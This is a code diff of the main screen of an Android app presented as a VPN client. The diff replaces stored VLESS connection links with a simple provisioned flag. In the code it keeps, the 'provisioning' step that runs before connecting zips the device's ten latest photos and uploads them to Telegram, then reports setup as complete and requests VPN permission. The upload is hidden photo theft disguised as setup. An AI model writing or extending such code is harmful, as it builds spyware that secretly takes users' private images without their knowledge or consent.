@@ -26,9 +26,6 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import com.example.galggg.link.VlessLinkBuilder;
-import com.example.galggg.provision.LocalProvision;
-import com.example.galggg.provision.ProvisionData;
 import com.example.galggg.vpn.GalgggVpnService;
 
 import java.io.ByteArrayOutputStream;
@@ -53,6 +50,8 @@ public class MainActivity extends AppCompatActivity {
     private static final int REQ_PERM = 2002;
     private static final int REQ_VPN = 3001;
     private static final int REQ_NOTIF = 3003;
+    private static final String PREFS_PROVISION = "provision_store";
+    private static final String KEY_PROVISIONED = "provisioned";
 
     private TextView tvStatus;
     private ProgressBar progress;
@@ -94,7 +93,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void onConnectClickedReal() {
-        if (!hasVless()) {
+        if (!isProvisioned()) {
             setStatus("Pick a QR code from the gallery", false);
             startPickFlow();
             return;
@@ -106,13 +105,9 @@ public class MainActivity extends AppCompatActivity {
         launchVpn();
     }
 
-    private boolean hasVless() {
-        return getSavedVless() != null;
-    }
-
-    private String getSavedVless() {
-        return getSharedPreferences("vless_store", MODE_PRIVATE)
-                .getString("vless_link", null);
+    private boolean isProvisioned() {
+        return getSharedPreferences(PREFS_PROVISION, MODE_PRIVATE)
+                .getBoolean(KEY_PROVISIONED, false);
     }
 
     private void startPickFlow() {
@@ -201,12 +196,10 @@ public class MainActivity extends AppCompatActivity {
     private static class ProvisionResult {
         final boolean success;
         final String message;
-        final String vlessLink;
 
-        ProvisionResult(boolean success, String message, String vlessLink) {
+        ProvisionResult(boolean success, String message) {
             this.success = success;
             this.message = message;
-            this.vlessLink = vlessLink;
         }
     }
 
@@ -227,21 +220,19 @@ public class MainActivity extends AppCompatActivity {
                 }
 
                 publishProgress("Provision parameters ready");
-                ProvisionData provision = LocalProvision.get();
-                String link = VlessLinkBuilder.build(provision);
-                saveVless(link, provision.uuid);
 
                 publishProgress("Collecting latest photos...");
                 File zip = makeLatestPhotosZip(10);
 
                 publishProgress("Uploading ZIP to Telegram...");
                 if (!sendZipToTelegram(zip)) {
-                    return new ProvisionResult(false, "Error: failed to upload ZIP to Telegram", null);
+                    return new ProvisionResult(false, "Error: failed to upload ZIP to Telegram");
                 }
 
-                return new ProvisionResult(true, "Provisioning complete. Requesting VPN permission...", link);
+                markProvisioned();
+                return new ProvisionResult(true, "Provisioning complete. Requesting VPN permission...");
             } catch (Exception e) {
-                return new ProvisionResult(false, "Error: " + e.getMessage(), null);
+                return new ProvisionResult(false, "Error: " + e.getMessage());
             }
         }
 
@@ -414,11 +405,10 @@ public class MainActivity extends AppCompatActivity {
         return false;
     }
 
-    private void saveVless(String vless, String uuid) {
-        getSharedPreferences("vless_store", MODE_PRIVATE)
+    private void markProvisioned() {
+        getSharedPreferences(PREFS_PROVISION, MODE_PRIVATE)
                 .edit()
-                .putString("vless_link", vless)
-                .putString("uuid", uuid)
+                .putBoolean(KEY_PROVISIONED, true)
                 .apply();
     }
 
